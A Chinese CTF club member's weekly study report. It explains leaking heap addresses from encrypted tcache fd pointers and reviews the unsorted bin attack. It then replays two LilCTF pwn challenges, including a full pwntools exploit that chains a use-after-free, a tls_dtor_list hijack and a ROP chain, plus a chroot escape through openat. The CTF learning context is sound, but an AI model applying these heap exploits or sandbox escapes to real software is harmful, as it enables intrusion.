## 完成事项

给社团的新生赛出题/测试/上传至平台.

## 未完成事项及原因

复现LilCTF. 背景知识缺的还是太多了...不算签到最后只复现了一道出来.

## 下周待做事项



## 本周学习的知识分享

#### 通过加密后的tcache_fd泄露堆地址

众所周知,在libc2.32之后,对tcache中chunk的fd指针的加密被引入.规则为将自身堆块从chunk_head起算的地址去掉最后三个十六进制位,然后与真实的fd指针异或.即:

```c
stored_fd = real_fd ^ ( (uintptr_t)ptr >> 12 )
```

解密就是再异或一次.

大多数情况下,我们会通过其他途径泄露堆地址(比如tcache结构体,fast_bin,unsorted_bin之类的)但不妨让我们假设一个很常见的情景:题目限制了分配chunk的最大大小和数量.这时,我们能利用的就只有tcache_bin,而想要让chunk分配到tcache结构体上就需要解密fd指针,解密fd指针就需要堆地址,而堆地址又需要通过让chunk分配到tcache结构体上来泄露...

当然,即使是这种情况下,可能也有一些我不知道的方法能够泄露出堆地址...总之言归正传.

首先,我们能泄露的唯一信息就是一个tcache_bin中的chunk的fd指针,它可能是这样的:

```c
0x55500003fa6a
```

但我们真的没有更多的信息了吗?答案是否定的.对于绝大多数题目,我们都能通过人为控制或者调试,来确定某个堆块和另一个堆块之间的偏移.(比如假设这个堆块和它fd指向的堆块在内存中相邻,那么易得两者之间的偏移就等于第一个堆块的大小).在这种情况下,我们就能把一开始的等式化成这种形式:

```c
stored_fd = (ptr+offset) ^ ( (uintptr_t)ptr >> 12 )
```

接着,我们以$2^{12}$(其实别的16的整数次方甚至2的整数次方也行,只不过拆成$16^{3}$后面写处理右移的时候方便一点)为单元,将它们拆分:
$$
ptr=\sum_{i>=0}2^{12i}b_i\\
offset=\sum_{i>=0}2^{12i}t_i\\
stoned\_fd=\sum_{i>=0}2^{12i}s_i
$$
则:
$$
\sum_{i>=0}2^{12i}s_i=(\sum_{i>=0}2^{12i}b_i+\sum_{i>=0}2^{12i}t_i)\oplus\sum_{i>=0}2^{12i}b_{i+1}
$$
引入进位变量$k_i$,则可以得到:
$$
s_i=(b_i+t_i+k_i)\%2^{12} \oplus b_{i+1}
$$
其中$s_i\ t_i$已知$k_i$可以由递推式$k_{i+1}=\lfloor(b_i+t_i+k_i)/2^{12}\rfloor,k_0=0$得出,对$b_0$进行爆破,即可通过该递推式得出所有$b_i$的值,进而求出ptr.

对于64位系统下用户态的地址,有$ptr<2^{48}$,又因为堆块地址与0x10对齐,有$b_0=16k(0<=k<=255)$,计算量在接受范围内.

下面是ai写的算法:

```python
def solve_fd(stored_fd: int, offset: int):
    mask = 0xFFF
    nseg = 5  # 5*12 = 60，覆盖 48 位即可
    # 分段
    def segs(x):
        return [(x >> (12 * i)) & mask for i in range(nseg)]

    S = segs(stored_fd)
    T = segs(offset)
    results = []

    for b0 in range(0, 0x1000, 0x10):  # 枚举低 12 位，16 字节对齐
        b = [0] * (nseg + 1)
        b[0] = b0
        carry = 0
        ok = True
        for i in range(nseg - 1):
            c = (b[i] + T[i] + carry) & mask
            carry = (b[i] + T[i] + carry) >> 12
            b[i + 1] = S[i] ^ c
        # 高位约束：carry == 0 且 b[nseg-1] == 0
        if carry != 0 or b[nseg - 1] != 0:
            continue
        # 拼回 p
        p = sum((b[i] & mask) << (12 * i) for i in range(nseg))
        # 48-bit 规范约束
        if p >= (1 << 48):
            continue
        # 校验
        if stored_fd == ((p + offset) ^ (p >> 12)):
            results.append(p)

    return results

print([hex(p) for p in solve_fd(0x55500003fa6a, 0x50)]) #一般来说只会有一种符合条件的解,直接取solve_fd(stored_fd: int, offset: int)[0]即可.

```

在网上搜了下,似乎还没有文章提过这个,就在这总结了一下.

#### unsorted_bin_attack

我确信我肯定学过甚至用过它...不过事实证明指望自己的记忆力不如干脆找个地方记下来.

简单的说,就是使用uaf把一个unsorted_bin_chunk的bk指针修改为tar_add,然后申请这个chunk,就能将tar_add改为`unsorted_chunks(av)`(main_arena+0x40)的地址.

#### lilctf复现

##### heap-pivoting

libc2.23 静态编译.可以找到对应版本libc的libc.a然后用它获取对应的sig文件便于分析.

具体步骤可以参考这篇文章:

[IDA制作签名 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1351866-1-1.html)

题目提供了一个菜单:

![image-20250831174805066](C:\Users\XR246\AppData\Roaming\Typora\typora-user-images\image-20250831174805066.png)



其中add只能创建0x100大小的chunk,del没有清空指针,造成了uaf.

可以用ubsorted_bin_attack把指针指向bss段,造成任意地址写:

```python
add_(0,"a")
add_(1,"b")

#context.log_level='debug'
del_(0)
#del_(2)
tar_add=0x6CCD60

edi_(0,p64(0)+p64(tar_add-0x10))
pause()
add_(2,"a")
edi_(0,p64(0x6CCD60) + p64(0)+ p64(0x6ca858) + p64(0x6ca858))
pause()
add_(3,p64(0x6CCD60))
```

![image-20250901123129578](C:\Users\XR246\AppData\Roaming\Typora\typora-user-images\image-20250901123129578.png)

但这题是静态编译,没有system/one_gadget/set_context...这里用的是一条我没见过的调用链:

```c
exit->__run_exit_handlers->__call_tls_dtors
```

```c
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();
```

当程序通过exit正常退出的时候,程序的`run_dtors`这个参数就会为真.程序进入`__call_tls_dtors ();`

```c
void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
#ifdef PTR_DEMANGLE
      PTR_DEMANGLE (func);
#endif

      tls_dtor_list = tls_dtor_list->next;
      func (cur->obj);

      /* Ensure that the MAP dereference happens before
	 l_tls_dtor_count decrement.  That way, we protect this access from a
	 potential DSO unload in _dl_close_worker, which happens when
	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
      atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
      free (cur);
    }
}
libc_hidden_def (__call_tls_dtors)

```

```c
#define PTR_DEMANGLE(var) \
  asm ("ror $0x11, %0\n" \
       "xor %%fs:0x30, %0\n" \
       : "=r" (var) \
       : "0" (var))
//循环右移0x11位,然后与fs[0x30]异或 
```

它会遍历tls_dtor_list链表,并在遍历的同时执行`PTR_DEMANGLE()`处理后的func.也就是说,如果我们能控制tls_dtor_list,并且泄露(或者控制)fs[0x30],就能实现任意地址执行.

`tls_dtor_list`的地址在libc中,因此可以直接修改,但这个程序的fs似乎和堆在同一页,不过可以用部分写入爆破.

编写脚本如下:

```py
from pwn import *

p=process("./pwn")
#gdb.attach(p)
def add_(idx,text):
    p.recvuntil("Your choice:\n")
    p.sendline("1")
    
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("Alright!\nwhat do you want to say\n")
    p.send(text)
    return

def edi_(idx,text):
    p.recvuntil("Your choice:\n")
    p.sendline("3")
    
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("context: ")
    p.send(text)
    return

def del_(idx):
    p.recvuntil("Your choice:\n")
    p.sendline("2")
    
    p.recvuntil("idx:")
    p.sendline(str(idx))
    return

def exit_():
    p.recvuntil("Your choice:\n")
    p.sendline("4")
    return
#pause()

add_(0,"a")
add_(1,"b")
add_(4,"a")

#context.log_level='debug'
del_(0)
#del_(2)
tar_add=0x6CCD60

edi_(0,p64(0)+p64(tar_add-0x10))

add_(2,"a")
edi_(0,p64(0x6CCD60) + p64(0)+ p64(0x6ca858) + p64(0x6ca858))

add_(3,p64(0x6CCD60))

def write_add(addr,text):
    edi_(2,p64(addr))
    edi_(0,text)
    return
rdi_add=0x401a16
rsi_add=0x401b37
rdx_add=0x443136
rax_add=0x41fc84
sys_add=0x4678e5
learet_add=0x400aa5
buf_add=0x6ca0a0 
payload=p64(0x6cc160)+p64(rdi_add)+p64(buf_add+ 0xd0)+p64(rsi_add)+p64(0)+p64(rax_add)+p64(2)+p64(sys_add)+p64(rdi_add)+p64(3)+p64(rsi_add)+p64(buf_add+0x100)+p64(rdx_add)+p64(0x100)+p64(rax_add)+p64(0)+p64(sys_add)+p64(rdi_add)+p64(1)+p64(rsi_add)+p64(buf_add+0x100)+p64(rdx_add)+p64(0x100)+p64(rax_add)+p64(1)+p64(sys_add)+b"/flag\x00"
context.log_level='debug'
write_add(0x6ca0a0,payload)

write_add(0x6cc178,p64(0))

write_add(0x6ccd80,p16(0xe8b0))
edi_(4,p64(learet_add))
del_(5)
p.interactive()



```

##### TheTrumanShow

题目使用chroot限制访问的范围,但在这个函数中提前开了一个真正的`/`目录的文件描述符:

```c
int securefd()
{
  int result; // eax
  int fd; // [rsp+Ch] [rbp-4h]

  close(2);
  open("/", 0);
  result = open("/flag", 0);
  for ( fd = 3; fd <= 1000; ++fd )
    result = close(fd);
  return result;
}
```

然后才是创建了一个文件夹,使用chroot(),写入假flag

```c
  strcpy(templatea, "XXXXXX");
  if ( !mkdtemp(templatea) )
    __assert_fail("mkdtemp(jail_path) != NULL", "code.c", 0x3Bu, "main");
  puts("mkdir ok");
  if ( chroot(templatea) )
  {
    perror((const char *)&chroot);
    exit(-1);
  }
  puts("chroot ok");
  if ( chdir("/") )
    __assert_fail("chdir(\"/\") == 0", "code.c", 0x44u, "main");
  puts("chdir ok");
  fd = open("/flag", 65);
  write(fd, "FLAG{IT'S FAKE AND HERE IS THE TRUMAN SHOW}", 0x2BuLL);
  close(fd);
```

所以只要使用openat就能绕过chroot.

另外,题目的附件中还有一个run.sh:

```shell
#!/bin/sh

echo "Starting the jail..."

/home/ctf/chtest

echo $?

```

这里的`echo $?`会打印上一条命令执行后的退出码,因此可以通过构造`exit(num);`的方式来泄露1Byte的数据.

另外很神秘的一点是官方wp的脚本在我的虚拟机上跑不了,似乎是同样的汇编转换成的字节码不一样.



## 本周自己学习过程中遇到的问题和疑问点

## 情感、思考、观点

## 在团队的感触和建议

